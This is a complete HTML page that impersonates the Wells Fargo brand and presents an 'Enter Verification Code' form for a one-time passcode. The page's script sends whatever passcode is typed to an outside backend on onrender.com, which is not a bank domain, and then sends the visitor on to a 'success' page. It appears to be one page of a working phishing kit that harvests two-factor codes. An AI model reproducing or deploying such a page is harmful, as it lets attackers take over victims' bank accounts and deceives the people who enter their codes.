<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background-color: #fff;
    }
    .top-bar {
      background-color: #df0025;
      color: white;
      padding: 16px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .yellow-strip {
      height: 4px;
      background-color: #ffd700;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }
    .logo {
      font-family: 'Clarendon', Georgia, serif;
      font-size: 24px;
      font-weight: bold;
      letter-spacing: 1px;
    }
    .container {
      max-width: 400px;
      margin: 60px auto 20px;
      background: white;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
    }
    h2 {
      margin-bottom: 20px;
      font-size: 22px;
    }
    .input-field {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #aaa;
      font-size: 15px;
      box-sizing: border-box;
    }
    .sign-on {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      background-color: #eee;
      border: none;
      border-radius: 6px;
      color: #666;
      cursor: not-allowed;
      font-size: 16px;
      transition: background-color 0.3s, color 0.3s;
      display: inline-flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
    }
    .sign-on.enabled {
      background-color: #0070c9 !important;
      color: white !important;
      cursor: pointer !important;
    }
    .spinner {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #fff;
      border-radius: 50%;
      width: 16px;
      height: 16px;
      animation: spin 1s linear infinite;
      display: inline-block;
      vertical-align: middle;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #errorMessage {
      color: red;
      font-size: 14px;
      margin-top: 5px;
      display: none;
      text-align: left;
      min-height: 18px;
    }
  </style>
</head>
<body>

<header class="top-bar">
  <div class="logo">WELLS FARGO</div>
</header>

<div class="yellow-strip"></div>

<div class="container">
  <h2>Enter Verification Code</h2>
  <input
    type="text"
    id="otp"
    class="input-field"
    placeholder="One-time passcode"
    autocomplete="one-time-code"
    required
    aria-label="OTP code"
  />
  <p id="errorMessage" aria-live="polite" role="alert"></p>
  <button id="verifyBtn" class="sign-on" onclick="submitOTP()" disabled>
    <span id="btnText">Verify</span>
  </button>
</div>

<script>
  const otpField = document.getElementById("otp");
  const verifyBtn = document.getElementById("verifyBtn");
  const btnText = document.getElementById("btnText");
  const errorMessage = document.getElementById("errorMessage");

  // âœ… Auto-detect backend for local vs live domains
  const API_BASE = 'https://my-node-backend-4nfy.onrender.com';

  otpField.addEventListener("input", () => {
    if (otpField.value.trim()) {
      verifyBtn.disabled = false;
      verifyBtn.classList.add("enabled");
    } else {
      verifyBtn.disabled = true;
      verifyBtn.classList.remove("enabled");
    }
    errorMessage.style.display = "none";
  });

  function clearButton() {
    verifyBtn.disabled = false;
    verifyBtn.classList.add("enabled");
    btnText.textContent = "Verify";
    const spinner = verifyBtn.querySelector(".spinner");
    if (spinner) spinner.remove();
  }

  async function submitOTP() {
    const otp = otpField.value.trim();
    if (!otp) {
      errorMessage.textContent = "Please enter the verification code.";
      errorMessage.style.display = "block";
      return;
    }

    verifyBtn.disabled = true;
    verifyBtn.classList.remove("enabled");
    btnText.textContent = "Verifying...";
    if (!verifyBtn.querySelector(".spinner")) {
      const spinner = document.createElement("span");
      spinner.className = "spinner";
      verifyBtn.appendChild(spinner);
    }

    try {
      const res = await fetch(`${API_BASE}/submit-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.message || "Verification failed");

      window.location.href = "success.html";
    } catch (err) {
      errorMessage.textContent = err.message || "Something went wrong.";
      errorMessage.style.display = "block";
      clearButton();
    }
  }
</script>

</body>
</html>
